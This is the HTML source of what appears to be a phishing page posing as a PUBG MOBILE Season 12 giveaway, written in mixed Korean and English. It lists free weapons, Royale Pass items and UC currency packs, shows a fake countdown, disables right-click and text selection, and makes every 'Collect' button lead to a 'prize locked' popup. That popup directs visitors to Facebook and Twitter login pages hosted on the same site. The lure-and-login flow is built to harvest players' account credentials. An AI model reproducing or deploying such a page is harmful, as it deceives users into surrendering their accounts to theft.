
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE">
<meta name="description" content="Latest PUBG MOBILE update. Get an exclusive Season 12 prize especially for you !!!">
<meta property="og:description" content="Latest PUBG MOBILE update. Get an exclusive Season 12 prize especially for you !!!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE">
<meta property="og:type" content="website">
<meta name="copyright" content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="img/banner.png">
<title>PUBG MOBILE</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="img/logo.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" style="">

<style type="text/css">
#collect fieldset:not(:first-of-type) {
display: none;
}
</style>
  
<div class="container">
<div class="container-mask">

<div class="header">
<img src="https://s7d7.turboimg.net/t1/51352805_s4_icon1.png">
<b>PUBG MOBILE</b>
<br>
<span>SEASON 12 2GETHER WE PLAY</span>
</div>

<div class="box">

<center>
<div class="menu active" onmousedown="buka.play()" onclick="openHero(event, 'latest');" id="defaultOpen">Weapons Lab</div>
<div class="menu" onmousedown="buka.play()" onclick="openHero(event, 'season');">Royale Pass</div>
<div class="menu" onmousedown="buka.play()" onclick="openHero(event, 'other');">Unknown Cash</div>
<div class="alert">
- 무기, 아이템 또는 알 수 없는 현금을 선택하고 로그인하여 상품을 받으세요
<br>
- 아래로 스크롤하여 더 많은 보상을 확인하세요
<br>
<span id="timer1">이벤트 종료 23 : 56 : 38</span>
</div>
</center>

<div id="latest" class="gallery" style="display: block;">
<div class="scroll">
<center>
<div class="item">
<img src="https://s7d6.turboimg.net/t1/51384402_18.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="https://s7d6.turboimg.net/t1/51384408_19.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="https://s7d6.turboimg.net/t1/51384415_20.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d6.turboimg.net/t1/51384420_21.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963207_1.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963208_2.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963209_3.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963210_4.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963211_5.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963212_6.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963213_7.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963214_8.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963215_9.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d6.turboimg.net/t1/50834863_10.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963217_11.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963218_12.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963219_13.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963220_14.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963221_15.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963222_16.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="https://s7d5.turboimg.net/t1/49963223_17.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
</center>
</div>
</div>

<div id="season" class="gallery" style="display: block;">
<div class="scroll">
<center>
<div class="item">
<img src="img/item/season/1.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="img/item/season/2.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="img/item/season/3.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
<div class="item">
<img src="img/item/season/4.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/5.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/6.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/7.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/8.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/9.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/10.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/11.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/12.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/13.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/14.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/15.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/16.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/17.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/18.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
<div class="item">
<img src="img/item/season/19.png">
<div>
<button onmousedown="buka.play();" onclick="collect();">Collect</button>
</div>
</div>
</center>
</div>
</div>

<div id="other" class="gallery" style="display: none;">
<div class="scroll">
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 60 UC<br><span>Additional Reward for Season 12</span></p>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
<br>
<br>
<br>
<br>
<br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 180 + 10 UC<br><span>Additional Reward for Season 12</span></p>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
<br>
<br>
<br>
<br>
<br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 300 + 25 UC<br><span>Additional Reward for Season 12</span></p>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
<br>
<br>
<br>
<br>
<br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 600 + 60 UC<br><span>Additional Reward for Season 12</span></p>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
<br>
<br>
<br>
<br>
<br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 1500 + 300 UC<br><span>Additional Reward for Season 12</span></p>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
<br>
<br>
<br>
<br>
<br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png">
3000 + 850 UC<br><span>Additional Reward for Season 12</span></p>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
<br>
<br>
<br>
<br>
<br>
<div class="balance">
<p><img class="uc-quantity" src="img/uc.png"> 6100 + 2100 UC<br><span>Additional Reward for Season 12</span></p>
<button onmousedown="buka.play();" onclick="collect();">가져</button>
</div>
</div>
</div>


</div> <!--- box --->
</div> <!--- container mask --->
</div> <!--- container --->

<div class="popup" style="display: none;">
<div class="popup-box animated fadeInDown">
<div class="nav-popup">
<center>
<h2>확인 및 로그인</h2>
</center>
</div>
<form id="collect" novalidate="" action="" method="post">
<fieldset>
<div class="alert">이 상품을 꼭 받으시겠습니까?</div>
<img src="img/logo.png">
<br>
<button type="button" onmousedown="tutup.play()" class="btn-form" onclick="closepopup()">취소</button>
<button type="button" name="next" onmousedown="buka.play()" class="btn-form next">수집</button>
<br>
<br>
</fieldset>
<fieldset>
<div class="alert">Selected prize locked. <br> Log in using your PUBG MOBILE account to receive prize</div>
<button type="button" class="btn-login facebook" onclick="location.href='login/facebook';"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="btn-login twitter" onclick="location.href='login/twitter';"><i class="fa fa-twitter icon-login"></i> Log in using Twitter account</button>
<br>
<button type="button" name="previous" onmousedown="tutup.play()" class="btn-form previous">Back to home</button>
<br>
<br>
</fieldset>
</form>
</div>
</div>

<!--- fieldset content --->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<!--- /fieldset content --->
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/fieldset.js"></script>
<script src="js/click.js"></script>


</body></html>